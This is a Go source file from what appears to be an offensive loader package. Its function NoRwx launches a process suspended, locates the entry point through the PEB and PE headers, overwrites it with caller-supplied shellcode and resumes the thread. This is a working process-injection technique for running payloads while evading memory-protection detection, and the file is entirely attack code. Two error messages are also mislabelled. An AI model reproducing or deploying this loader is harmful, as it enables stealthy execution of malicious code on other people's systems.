package loader

import (
	"encoding/binary"
	"fmt"
	"unsafe"
	"variant/wdll"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func NoRwx(shellcode []byte, path string) error {
	var info int32
	var returnLength int32

	var pbi windows.PROCESS_BASIC_INFORMATION
	var si windows.StartupInfo
	var pi windows.ProcessInformation

	cpErr := xwindows.CreateProcessW(
		nil,
		windows.StringToUTF16Ptr(path),
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi,
	)
	if cpErr != nil {
		return fmt.Errorf("NtQueryInformationProcess failed: %w", cpErr)
	}

	_, ntErr := xwindows.NtQueryInformationProcess(
		pi.Process,
		uint32(info),
		unsafe.Pointer(&pbi),
		unsafe.Sizeof(windows.PROCESS_BASIC_INFORMATION{}),
		(*uintptr)(unsafe.Pointer(&returnLength)),
	)
	if ntErr != nil {
		return fmt.Errorf("NtQueryInformationProcess failed: %w", ntErr)
	}

	pebOffset := uintptr(unsafe.Pointer(pbi.PebBaseAddress)) + 0x10
	var imageBase uintptr = 0

	/*
	   BOOL ReadProcessMemory(
	     [in]  HANDLE  hProcess,
	     [in]  LPCVOID lpBaseAddress,
	     [out] LPVOID  lpBuffer,
	     [in]  SIZE_T  nSize,
	     [out] SIZE_T  *lpNumberOfBytesRead
	   );
	*/

	rpErr := xwindows.ReadProcessMemory(
		pi.Process,
		pebOffset,
		(*byte)(unsafe.Pointer(&imageBase)),
		8,
		nil,
	)
	if rpErr != nil {
		return fmt.Errorf("ReadProcessMemory imageBase failed: %w", rpErr)
	}

	headersBuffer := make([]byte, 4096)

	rpmErr := xwindows.ReadProcessMemory(
		pi.Process,
		imageBase,
		&headersBuffer[0],
		4096,
		nil,
	)
	if rpmErr != nil {
		return fmt.Errorf("ReadProcessMemory headersBuffer failed: %w", rpmErr)
	}

	// Parse DOS header e_lfanew entry to calculate entry point address
	var dosHeader wdll.IMAGE_DOS_HEADER
	dosHeader.E_lfanew = binary.LittleEndian.Uint32(headersBuffer[60:64])
	ntHeader := (*xwindows.IMAGE_NT_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(&headersBuffer[0])) + uintptr(dosHeader.E_lfanew)))
	codeEntry := uintptr(ntHeader.OptionalHeader.AddressOfEntryPoint) + imageBase

	/*
	   BOOL WriteProcessMemory(
	     [in]  HANDLE  hProcess,
	     [in]  LPVOID  lpBaseAddress,
	     [in]  LPCVOID lpBuffer,
	     [in]  SIZE_T  nSize,
	     [out] SIZE_T  *lpNumberOfBytesWritten
	   );
	*/

	wpErr := xwindows.WriteProcessMemory(
		pi.Process,
		codeEntry,
		&shellcode[0],
		uintptr(len(shellcode)),
		nil,
	)
	if wpErr != nil {
		return fmt.Errorf("WriteProcessMemory failed: %w", rpmErr)
	}

	_, rtErr := xwindows.ResumeThread(pi.Thread)
	if rtErr != nil {
		return fmt.Errorf("ResumeThread failed: %w", rtErr)
	}

	return nil
}
